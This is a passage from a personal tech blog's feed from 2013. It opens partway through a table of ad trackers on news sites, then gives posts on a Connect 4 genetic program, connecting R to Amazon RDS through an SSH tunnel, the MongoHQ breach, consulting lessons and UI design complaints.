Network</td></tr><tr><td>BBC</td><td>[x+1]</td><td>Publisher</td></tr><tr><td>BBC</td><td>Acxiom</td><td>Publisher</td></tr><tr><td>BBC</td><td>AdMeld</td><td>Publisher</td></tr><tr><td>BBC</td><td>Advertising.com</td><td>Publisher</td></tr><tr><td>BBC</td><td>AdXpose</td><td>Publisher</td></tr><tr><td>BBC</td><td>Aggregate Knowledge</td><td>Publisher</td></tr><tr><td>BBC</td><td>AppNexus</td><td>Publisher</td></tr><tr><td>BBC</td><td>Atlas</td><td>Publisher</td></tr><tr><td>BBC</td><td>Audience Science</td><td>Publisher</td></tr><tr><td>BBC</td><td>BlueKai</td><td>Publisher</td></tr><tr><td>BBC</td><td>BrightRoll</td><td>Publisher</td></tr><tr><td>BBC</td><td>Brilig</td><td>Publisher</td></tr><tr><td>BBC</td><td>Casale Media</td><td>Publisher</td></tr><tr><td>BBC</td><td>Datalogix</td><td>Publisher</td></tr><tr><td>BBC</td><td>DoubleClick</td><td>Publisher</td></tr><tr><td>BBC</td><td>DoubleClick Spotlight</td><td>Publisher</td></tr><tr><td>BBC</td><td>Effective Measure</td><td>Publisher</td></tr><tr><td>BBC</td><td>Facebook Exchange (FBX)</td><td>Publisher</td></tr><tr><td>BBC</td><td>Google Adsense</td><td>Publisher</td></tr><tr><td>BBC</td><td>Media Innovation Group</td><td>Publisher</td></tr><tr><td>BBC</td><td>MediaMath</td><td>Publisher</td></tr><tr><td>BBC</td><td>Mindset Media</td><td>Publisher</td></tr><tr><td>BBC</td><td>NetRatings SiteCensus</td><td>Publisher</td></tr><tr><td>BBC</td><td>Neustar AdAdvisor</td><td>Publisher</td></tr><tr><td>BBC</td><td>Omniture (Adobe Analytics)</td><td>Publisher</td></tr><tr><td>BBC</td><td>OpenX</td><td>Publisher</td></tr><tr><td>BBC</td><td>PubMatic</td><td>Publisher</td></tr><tr><td>BBC</td><td>Right Media</td><td>Publisher</td></tr><tr><td>BBC</td><td>Rocket Fuel</td><td>Publisher</td></tr><tr><td>BBC</td><td>Rubicon</td><td>Publisher</td></tr><tr><td>BBC</td><td>ScoreCard Research Beacon</td><td>Publisher</td></tr><tr><td>BBC</td><td>SpotXchange</td><td>Publisher</td></tr><tr><td>BBC</td><td>TrackingSoft</td><td>Publisher</td></tr><tr><td>NY Times</td><td>Acxiom</td><td>Publisher</td></tr><tr><td>NY Times</td><td>AppNexus</td><td>Publisher</td></tr><tr><td>NY Times</td><td>Atlas</td><td>Publisher</td></tr><tr><td>NY Times</td><td>Audience Science</td><td>Publisher</td></tr><tr><td>NY Times</td><td>Brightcove</td><td>Publisher</td></tr><tr><td>NY Times</td><td>ChartBeat</td><td>Publisher</td></tr><tr><td>NY Times</td><td>Datalogix</td><td>Publisher</td></tr><tr><td>NY Times</td><td>DoubleClick</td><td>Publisher</td></tr><tr><td>NY Times</td><td>eXelate</td><td>Publisher</td></tr><tr><td>NY Times</td><td>Facebook Connect</td><td>Publisher</td></tr><tr><td>NY Times</td><td>Google Adsense</td><td>Publisher</td></tr><tr><td>NY Times</td><td>Krux Digital</td><td>Publisher</td></tr><tr><td>NY Times</td><td>Moat</td><td>Publisher</td></tr><tr><td>NY Times</td><td>NetRatings SiteCensus</td><td>Publisher</td></tr><tr><td>NY Times</td><td>New York Times</td><td>Publisher</td></tr><tr><td>NY Times</td><td>ScoreCard Research Beacon</td><td>Publisher</td></tr><tr><td>NY Times</td><td>Typekit by Adobe</td><td>Publisher</td></tr><tr><td>NY Times</td><td>VoiceFive</td><td>Publisher</td></tr><tr><td>NY Times</td><td>WebTrends</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>24/7 Media Ad Network</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>AppNexus</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>Audience Science</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>BrightRoll</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>ChartBeat</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>Criteo</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>DoubleClick</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>Evidon Notice</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>Facebook Connect</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>Facebook Social Graph</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>ForeSee</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>Google Adsense</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>Google AdWords Conversion</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>Google AJAX Search API</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>Integral Ad Science</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>Media6Degrees</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>MediaMath</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>NetRatings SiteCensus</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>Omniture (Adobe Analytics)</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>Optimizely</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>Outbrain</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>Quantcast</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>Right Media</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>Rubicon</td><td>Publisher</td></tr><tr><td>The Guardian</td><td>ScoreCard Research Beacon</td><td>Publisher</td></tr><tr><td>Forbes</td><td>24/7 Media Ad Network</td><td>Publisher</td></tr><tr><td>Forbes</td><td>[x+1]</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Acxiom</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Adap.tv</td><td>Publisher</td></tr><tr><td>Forbes</td><td>AddThis</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Advertising.com</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Aggregate Knowledge</td><td>Publisher</td></tr><tr><td>Forbes</td><td>AMP Platform</td><td>Publisher</td></tr><tr><td>Forbes</td><td>AppNexus</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Audience Science</td><td>Publisher</td></tr><tr><td>Forbes</td><td>BlueKai</td><td>Publisher</td></tr><tr><td>Forbes</td><td>BrightRoll</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Brilig</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Datalogix</td><td>Publisher</td></tr><tr><td>Forbes</td><td>DoubleClick</td><td>Publisher</td></tr><tr><td>Forbes</td><td>DoubleClick Bid Manager</td><td>Publisher</td></tr><tr><td>Forbes</td><td>DoubleClick Spotlight</td><td>Publisher</td></tr><tr><td>Forbes</td><td>eXelate</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Google Adsense</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Google Analytics</td><td>Publisher</td></tr><tr><td>Forbes</td><td>i-Behavior</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Intent Media</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Lotame</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Martini Media</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Media Innovation Group</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Media.net</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Moat</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Omniture (Adobe Analytics)</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Quantcast</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Right Media</td><td>Publisher</td></tr><tr><td>Forbes</td><td>ScoreCard Research Beacon</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Tacoda</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Tapad</td><td>Publisher</td></tr><tr><td>Forbes</td><td>TidalTV</td><td>Publisher</td></tr><tr><td>Forbes</td><td>TradeDesk</td><td>Publisher</td></tr><tr><td>Forbes</td><td>TRUSTe Notice</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Turn</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Undertone</td><td>Publisher</td></tr><tr><td>Forbes</td><td>Visual Revenue</td><td>Publisher</td></tr><tr><td>USA Today</td><td>AdRoll</td><td>Publisher</td></tr><tr><td>USA Today</td><td>Audience Science</td><td>Publisher</td></tr><tr><td>USA Today</td><td>BuzzFeed</td><td>Publisher</td></tr><tr><td>USA Today</td><td>ChartBeat</td><td>Publisher</td></tr><tr><td>USA Today</td><td>Datalogix</td><td>Publisher</td></tr><tr><td>USA Today</td><td>DoubleClick</td><td>Publisher</td></tr><tr><td>USA Today</td><td>Evidon Notice</td><td>Publisher</td></tr><tr><td>USA Today</td><td>Facebook Connect</td><td>Publisher</td></tr><tr><td>USA Today</td><td>Google Adsense</td><td>Publisher</td></tr><tr><td>USA Today</td><td>Media Optimizer (Adobe)</td><td>Publisher</td></tr><tr><td>USA Today</td><td>Moat</td><td>Publisher</td></tr><tr><td>USA Today</td><td>Quantcast</td><td>Publisher</td></tr><tr><td>USA Today</td><td>Right Media</td><td>Publisher</td></tr><tr><td>USA Today</td><td>ScoreCard Research Beacon</td><td>Publisher</td></tr><tr><td>USA Today</td><td>SimpleReach</td><td>Publisher</td></tr><tr><td>USA Today</td><td>Tealium</td><td>Publisher</td></tr><tr><td>USA Today</td><td>TrackingSoft</td><td>Publisher</td></tr><tr><td>USA Today</td><td>Visual Revenue</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>Acxiom</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>Adobe Test &amp; Target</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>Amazon Associates</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>Audience Science</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>Bizo</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>ChartBeat</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>Criteo</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>Datalogix</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>DoubleClick</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>eXelate</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>Google Adsense</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>Krux Digital</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>MediaMath</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>MediaMind</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>Moat</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>Neustar AdAdvisor</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>New Relic</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>Omniture (Adobe Analytics)</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>Outbrain</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>Quantcast</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>Quigo AdSonar</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>ScoreCard Research Beacon</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>SpotXchange</td><td>Publisher</td></tr><tr><td>Washington Post</td><td>Trove</td><td>Publisher</td></tr></tbody></table>
</p>

<p>
You can also grab the entire set of data <a href="http://dangoldin.com/assets/static/data/js-libraries-data.xlsx">here</a>.
</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Genetic programming Connect 4</title>
   <link href="http://dangoldin.com/2013/11/30/genetic-programming-connect-4/"/>
   <updated>2013-11-30T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/11/30/genetic-programming-connect-4</id>
   <content:encoded><![CDATA[
<p>Over Thanksgiving break I was going through some old GitHub repos and found an interesting one I wanted to share. It’s a <a href="https://github.com/dangoldin/connect4bot" target="_blank">Connect 4 bot</a> that’s evolved through a genetic program. The goal of the strategy is to choose a column to move to that will give the highest probability of a win given a board position. To figure out the move column, the genetic program simulates play of strategy against strategy and gives the most successful ones a greater chance of reproducing into the next generation. The idea is that over time the resulting strategy will be the most fit.</p>

<p>The way a typical genetic program works is represented is through a tree structure with the leaf nodes (terminals) containing the various features of the input and the non-leaf nodes containing functions to evaluate the values in the leaf nodes. This way, the program can evaluate any input and we can create new functions by taking subbranches from one tree and combining them with another.</p>

<p>I used the <a href="http://pyevolve.sourceforge.net/" target="_blank">PyEvolve framework</a> which took care of all the simulation code so the bulk of my work was spent in figuring out which features and functions to use as well as a way of tracking the intermediate strategies so I could store the resulting strategy for later use. The features I ended up using where the number of own and opponent’s pieces adjacent to the move, the number of own and opponent’s 3 piece segments that would be created with the move, and the height of the column. I experimented with a few functions but ended up keeping a simple set of four - add, subtract, multiply, and an “is greater than” function.</p>

<p>In the end, the best I could get was a genetic program that was able to beat a random move strategy a little over 70% of the time. Unfortunately, this “optimal” strategy failed to win against a real strategy, such as <a href="http://en.wikipedia.org/wiki/Minimax#Minimax_algorithm_with_alternate_moves" target="_blank">minimax</a>. I suspect the strategy would have done a bit better had I trained it against a smarter set of strategies but I doubt it would have ever been able to compete with the minimax approach. I’m mostly amazed that by starting with a few features and some simple functions it’s possible to evolve a strategy that’s actually better than random. I doubt I can use this approach in a professional project but it’s still great being exposed to it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Blog analytics (blogolytics?)</title>
   <link href="http://dangoldin.com/2013/11/26/blog-analytics-blogolytics/"/>
   <updated>2013-11-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/11/26/blog-analytics-blogolytics</id>
   <content:encoded><![CDATA[
<p>Every time I launch a new website one of the first things I do is add <a href="http://www.google.com/analytics/" target="_blank">Google Analytics</a> to start gathering data. This blog was no different but I’ve recently been wondering whether Google Analytics is the right way to measure a blog. It’s great for tracking the total number of visitors, where they’re coming from, and how long they’re staying but I wish there was something that was optimized for blogs rather than something that was designed as a general solution.</p>

<p>My ideal blog analytics tool would help me understand both how readers are finding my content as well as how they’re engaging with it. It would also automatically segment my blog’s readers so I’d be able to quickly tell the different types of readers I have and what each of the groups is interested in seeing. Many of my posts end up being shared but I only discover that when I look at the referrals in Google Analytics. I’d also love to get a notification whenever one of my posts is shared on another site or social networks so I can participate in the discussion as it’s happening rather than days later.</p>

<p>I’m not sure about the available tools but I have some experience with <a href="https://mixpanel.com" target="_blank">MixPanel</a> and am going to see if I can jerry rig it to do what I want. It’s great for doing simple funnel and segmentation analysis but it should also be flexible enough to do a ton more stuff. One thing I’ve been thinking about is generating additional meta data for each of my posts (topics, number of words, number of images) and then feeding that into MixPanel to see what impact they have. I’ll share both the source code and results once I have it up and running.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>I'm joining TripleLift</title>
   <link href="http://dangoldin.com/2013/11/23/im-joining-triplelift/"/>
   <updated>2013-11-23T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/11/23/im-joining-triplelift</id>
   <content:encoded><![CDATA[
<p>Just a quick update on my professional life. I recently joined <a href="http://triplelift.com/" target="_blank">TripleLift</a>’s engineering team. I met the founders while at <a href="http://eranyc.com/" target="_blank">ERA</a> and liked the problem they were solving. It was also time for me to move on from my other projects so when I found out they were growing it was a pretty easy decision. Being a startup, it’s hard to pinpoint exactly what everyone’s responsibilities are since everyone becomes a generalist but I’ve been focused on the data side. This entails developing our various data pipelines, leveraging the data we have to improve performance and unlock new opportunities, and doing some light data science to help model and understand the native advertising space.</p>

<p>In 2012, US marketers spent close to $15B on internet display ads and this number’s only growing. The old banner ad model is a huge chunk of it but it’s being supplanted by better, smarter technologies that provide significantly higher engagement rates. Social networks have embraced native advertising that blends into their products rather than being delegated to a sidebar or a banner that’s immediately ignored. Native advertising is a much better approach and I believe it’s going to take up the majority of display budgets within the next couple of years. TripleLift is doing some incredibly awesome things by allowing publishers to design sites around their content and then easily integrate ads that enhance the user experience rather than disrupt it while advertisers are able to get their ads in front of users that actually enjoy seeing them. It’s an evolution of display advertising that’s better for everyone involved that I can’t see it failing. Clearly I’m excited.</p>

<p>PS. TripleLift is hiring so let me know if you want to talk about the various roles and what we’re doing.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A Twitter flashback</title>
   <link href="http://dangoldin.com/2013/11/16/a-twitter-flashback/"/>
   <updated>2013-11-16T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/11/16/a-twitter-flashback</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/twitter-ecosystem.png" alt="The Twitter ecosystem" width="624" height="379" layout="responsive"/>

<p>I was going through my drafts and stumbled onto one that was going to criticize Twitter’s API changes that they <a href="https://dev.twitter.com/blog/changes-coming-to-twitter-api" target="_blank">announced last August</a>. In light of last week’s IPO I thought I’d finally finish it up.</p>

<p>The blog post described the changes Twitter planned on making with the intent of taking control of the developer ecosystem. The changes included being a lot more strict with their API by limiting the number of users a client could authenticate, reducing the volume of API calls, and requiring all Twitter content to be displayed the same way. The post also included a matrix indicating that Twitter did not want anyone developing on the consumer/engagement side but the rest being open.</p>

<p>At the time, many developers (me included) felt betrayed. We made Twitter successful and now we were limited in what we could do. In hindsight, these moves have been obvious. Since then, Twitter’s been rolling out a ton of changes that wouldn’t have been possible without controlling the entire experience. It also gave an indication of their monetization model. At the time, some thought that Twitter would try to monetize by selling access to the data feed or by offering premium features that large brands could use to control their pages. Turns out it was just advertising. By controlling the way every tweet is seen they’ve been able to roll out sponsored tweets and now, images.</p>

<p>I still think they took the easy way out by choosing an obvious business model and yet I can’t really fault them given last week’s result. It does make me wonder whether advertising is the business model of choice for an IPO.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>RDS and R</title>
   <link href="http://dangoldin.com/2013/11/15/rds-and-r/"/>
   <updated>2013-11-15T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/11/15/rds-and-r</id>
   <content:encoded><![CDATA[
<p>In my quest to replace Excel with R I’ve been spending the past week trying to do everything in R. It hasn’t been that easy with many things taking longer due to me having to reference the R docs but one thing that’s been great so far is being able to quickly run a query on Amazon’s RDS and pull data into a data frame for quick analysis. Being able to wrap this into a reusable function makes things even better. The one thing that makes it tricky was not being able to connect to RDS directly but having to tunnel through an EC2 instance. Below are the steps to replicate the setup.</p>

<p>In your shell, run the following command to set up the SSH tunnel:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh <span class="nt">-L</span> &lt;<span class="nb">local </span>port&gt;:&lt;rds host&gt;:&lt;rds port&gt;&lt;ec2 user&gt;@&lt;ec2 instance&gt;</code></pre></figure>

<p>Now in R:</p>

<figure class="highlight"><pre><code class="language-r" data-lang="r"><span class="n">install.packages</span><span class="p">(</span><span class="err">‘</span><span class="n">RMySQL</span><span class="err">’</span><span class="p">)</span><span class="w"> </span><span class="c1"># Install the R MySQL library</span><span class="w">
</span><span class="n">library</span><span class="p">(</span><span class="n">RMySQL</span><span class="p">)</span><span class="w"> </span><span class="c1"># Load the library</span><span class="w">
</span><span class="n">m</span><span class="o">&lt;-</span><span class="n">dbDriver</span><span class="p">(</span><span class="s2">"MySQL"</span><span class="p">)</span><span class="w"> </span><span class="c1"># Load the driver</span><span class="w">
</span><span class="n">con</span><span class="o">&lt;-</span><span class="n">dbConnect</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="n">user</span><span class="o">=</span><span class="s1">'username'</span><span class="p">,</span><span class="n">password</span><span class="o">=</span><span class="s1">'pass'</span><span class="p">,</span><span class="n">host</span><span class="o">=</span><span class="s1">'127.0.0.1'</span><span class="p">,</span><span class="n">dbname</span><span class="o">=</span><span class="s1">'db'</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="m">3307</span><span class="p">)</span><span class="w"> </span><span class="c1"># Connect to the local instance</span><span class="w">
</span><span class="n">res</span><span class="o">&lt;-</span><span class="n">dbSendQuery</span><span class="p">(</span><span class="n">con</span><span class="p">,</span><span class="w"> </span><span class="s1">'select * from table'</span><span class="p">)</span><span class="w"> </span><span class="c1"># Execute the query</span><span class="w">
</span><span class="n">data</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">fetch</span><span class="p">(</span><span class="n">res</span><span class="p">,</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">-1</span><span class="p">)</span><span class="w"> </span><span class="c1"># Load the retrieved data into a data frame</span><span class="w">
</span><span class="n">dbClearResult</span><span class="p">(</span><span class="n">dbListResults</span><span class="p">(</span><span class="n">con</span><span class="p">)[[</span><span class="m">1</span><span class="p">]])</span><span class="w"> </span><span class="c1"># Use this to free the connection</span></code></pre></figure>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Is Excel on a Mac intentionally hobbled?</title>
   <link href="http://dangoldin.com/2013/11/09/is-excel-on-a-mac-intentionally-hobbled/"/>
   <updated>2013-11-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/11/09/is-excel-on-a-mac-intentionally-hobbled</id>
   <content:encoded><![CDATA[
<p>The longer I’ve been involved in tech the fewer Windows laptops I’ve been seeing. It seems that to even be considered a startup you need to be giving your employees MacBooks. My conversion came years ago when I made the move from Linux in order to be able to run Excel since neither OpenOffice nor Google Spreadsheet were cutting it. Unfortunately, even after years of effort, I still can’t get to the same level of productivity as I had when using Windows during my consulting days. It’s entirely due to the shortcuts. Some of the shortcuts just changed while others simply disappeared.</p>

<p>The difference is most likely due to a different keyboard layout on a Mac but the cynic in me can’t help but think that it’s also a way to keep the Excel power users on Windows. No one in the finance or consulting industry will switch to Macs until the actual workflow of using applications is the same between Mac and Windows. The more power user focused an app is the more difficult it is to convince its users to switch from one OS to another. People already get annoyed when a minor change is introduced by a new version; I can’t imagine the reaction a new workflow would produce.</p>

<p>This is why the web apps are so intriguing, they’re able to maintain their look, feel, and functionality no matter where they’re accessed giving users the ability to choose the hardware that fits them. I’m already replacing Word with Google Docs but it’s going to take quite a bit of effort to get spreadsheet apps to the same level. In the mean time, I’m trying to replace Excel with R. I’m not there yet but improving every day.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Security in the wake of MongoHQ</title>
   <link href="http://dangoldin.com/2013/11/07/security-in-the-wake-of-mongohq/"/>
   <updated>2013-11-07T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/11/07/security-in-the-wake-of-mongohq</id>
   <content:encoded><![CDATA[
<p>Over the past few days my inbox has been filled with security alert emails caused by the <a href="https://www.mongohq.com/home" target="_blank">MongoHQ</a> database hack. I’m impressed by the number of customers MongoHQ was able to sign up - they spanned the gamut from sites that I don’t even recall signing up for to startups that have been getting significant buzz.</p>

<p>If a database as a service company is able to get hacked it doesn’t leave me optimistic about the way other companies are securing our data. As much as these “as a service” products make our lives easier they bring an increased risk to our business and more importantly our customers. Sure their security will be better than someone who’s setting up a MongoDB instance for the first time but that has to be balanced against the fact that a hosting site offers a much higher reward for a hacking attempt. Access to the infrastructure provides a lot more information than hacking an individual site.</p>

<p>I used to believe that doing security internally was dumb but now I’m not so sure. No one will care about hacking a small site and if it turns out that the site is becoming successful you can dedicate the resources to properly secure it. At the same time, with so many people sharing passwords across multiple accounts it only takes one careless site to undermine the efforts of all the others.</p>

<p>Some of the security alerts I’ve received have mentioned that they plan on managing their database internally rather than relying on a third party; I wonder if this is the start of a trend.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Why I run</title>
   <link href="http://dangoldin.com/2013/11/03/why-i-run/"/>
   <updated>2013-11-03T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/11/03/why-i-run</id>
   <content:encoded><![CDATA[
<p>In honor of today’s NYC marathon, I finally finished up this post that’s been sitting in my drafts folder the past few weeks.</p>

<p>I’ve never been into running until the beginning of this year when I decided to run 1000 miles. This led to me to three half marathons and is actually making me consider doing a full one. It’s amazing where a habit and a bit of effort can take you. Initially, I ran just to hit my goal and only signed up for races in order to keep myself motivated and on track. Now, it’s become significantly more than that. There are so many things outside my control yet running is solely about my effort and willpower. If I fail it’s my defeat and if I succeed it’s my victory. I can easily skip a run on a cold, rainy morning and yet I know I’m just deceiving myself and I’ll have to make it up later. Running is one of the simplest things to do and that’s a huge appeal. The human bodies have evolved to run and kids start running as soon as they learn to walk. As our world becomes increasingly complex it’s nice being able to escape with a quick run. Whether it’s running or something else, it’s important to have an outlet that rewards us based on our efforts. The further away this activity is from our day jobs the better.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>What the SEO? Followup</title>
   <link href="http://dangoldin.com/2013/10/30/what-the-seo-followup/"/>
   <updated>2013-10-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/10/30/what-the-seo-followup</id>
   <content:encoded><![CDATA[
<p>Last week I <a href="http://dangoldin.com/2013/10/20/what-the-seo/">posted</a> about a site my mom discovered that had copied the content from her site and has been positioning as their business. I had no clue what the motivation behind it was other than thinking it was just a sketchy way to either blackmail the real business owner or use black hat SEO tactics to increase traffic and monetize using AdSense.</p>

<p>After sharing my problem and getting a ton of advice, I sent a DMCA request to the host, Colocation America, and received a surprisingly quick reply. Within a few days I was on the phone with a representative from the site claiming that my mom had signed up for a service that was offering free mobile websites and that’s why my mom’s business information and content had been appearing on the other site. My mom doesn’t recall signing up for any site and I believe her - she’s been sending me nearly every offer she receives asking whether it’s legitimate and worth doing and I don’t recall ever seeing this one.</p>

<p>I suspect they use this as a cover for if they get caught and until then they make some money from their ads. In any case this particular issue was resolved pretty quickly and I wanted to thank everyone who helped. In particular, <a href="https://twitter.com/bofu2u" target="_blank">Rob Adler</a> did a ton of research on the infringing site and <a href="https://twitter.com/mattcutts" target="_blank">Matt Cutts</a> helped send this to the relevant teams at Google. The web’s not always getting worse!</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Lessons from consulting</title>
   <link href="http://dangoldin.com/2013/10/27/lessons-from-consulting/"/>
   <updated>2013-10-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/10/27/lessons-from-consulting</id>
   <content:encoded><![CDATA[
<p>To supplement my income while working on a startup, I took on a few consulting projects and wanted to share some lessons learned. It seems that everyone’s consulting experience is different so consider mine experience as just another data point.</p>

<ul class="bulleted">
  <li>I was able to get more work from my existing network than anything else I tried. As soon as I told people I was looking to take on some consulting projects I was able to get interest and referrals. If I didn’t have that I’m not sure how I would have gotten my first few projects.</li>
  <li>It took longer than I expected to agree on a project’s scope and get the contract signed. My approach was to do a call or meeting to understand the goals of the project and then break it down into components with an estimated time and cost for each piece. I liked this approach since we were able to discuss the priorities of various pieces and talk about the risks associated with each.</li>
  <li>It took longer to get paid than I expected. I was confident that I’d get paid but it took a few emails and meetings to get the payments made. The part that helped was getting an initial deposit before starting the work.</li>
  <li>The biggest benefit was the flexibility to choose when and how to work on the projects.  Unfortunately, this flexibility is better in the abstract. I didn’t find the flexibility that valuable since almost everyone I know is working at a full time job which causes me to also follow a pretty standard schedule.</li>
  <li>Most of the knowledge I gained was on the business/marketing side rather than on the tech side. I wasn’t doing challenging work and for the most part didn’t get a chance to work closely with others. The projects I did were also pretty independent so I had to resort to Google and Stack Overflow to help me deal with various questions that came up.</li>
  <li>The projects I had were not critical to the company and were mostly “nice to haves.” This had the effect of me not feeling very aligned with the company vision which made the projects less interesting than they should have been. I’m not sure if this was due to the way I positioned myself for consulting work or due to the companies not wanting to outsource their critical projects.</li>
  <li>A shared GitHub account worked amazingly well. The client was able to track the progress and provide feedback at various stages. This required me to commit well documented, working code but it definitely made communication easier. I also had a staging environment set up for my projects which let the clients see the code in action.</li>
  <li>I wrote a <a href="http://dangoldin.com/2013/09/28/pricing-small-consulting-projects/">post</a> last month on pricing smaller consulting projects and wanted to highlight that again. I would come up a time estimate for a project that would be billed at my usual rate. Any work that spilled over would be billed at a discounted rate. This gave clients confidence that my estimate was reasonable and gave them a sense of the total project cost.</li>
</ul>

<p>This was my first time doing serious consulting work and it’s a mixed bag. I enjoyed the flexibility but didn’t find it being a huge deal. I was also taking on projects that paid the bills but weren’t the most exciting. My biggest gripe was that I felt I wasn’t learning as much as I would have had I been working as part of a team. This gave the illusion that I was falling behind on my skills and not improving as much as others were.If I were to do it again, I’d want to specialize in a particular field and only do projects that fit in with my passions and interests. I’d also want to get it to the state where I’d be working alongside others rather than being entirely independent.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Some more design ranting</title>
   <link href="http://dangoldin.com/2013/10/23/some-more-design-ranting/"/>
   <updated>2013-10-23T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/10/23/some-more-design-ranting</id>
   <content:encoded><![CDATA[
<p>I don’t know why, but I’ve become more aware of the UI/UX of various sites and apps that I encounter. Whereas before I might have gotten frustrated about some behavior, I’m now starting to get annoyed whenever I encounter something that’s obviously crummy. Here’s a few of the more recent design anti-patterns I’ve been noticing.</p>

<ol>
  <li>Submitting a login form with the wrong password removes the entered email address. Especially on mobile, where it both takes longer to type and typos are more common, it’s crappy having to type both my email and password again if I made a simple typo in my password or just don’t know which of my passwords I used. A quick hack I saw that makes this a bit easier is to add a keyboard shortcut to your phone to replace “@@” (or any other character set) with your email address.</li>

  <li>
    <div class="right10">
      <img src="http://dangoldin.com/assets/static/images/bad-ui-register-vs-signin.png" alt="Bad UI: Register vs Sign In confusion" width="640" height="960" layout="responsive"/>
    </div>
    Confusing placement of sign in and register. I forget which app I saw this in but as you can screen from the screenshot I’m on the sign in screen and yet the button under the form is to register, which causes the app to load the registration screen. The sign in button is up top which is a confusing flow since the user goes down the page first before having to go back to the top. The fact that the app uses a flat UI makes this worse since there’s not a lot of differentiation between the sign in and register actions.
  </li>

  <li>
    <div class="right10">
      <img src="http://dangoldin.com/assets/static/images/bad-ui-contact-management.png" alt="Bad UI: Contact management" width="640" height="960" layout="responsive"/>
    </div>
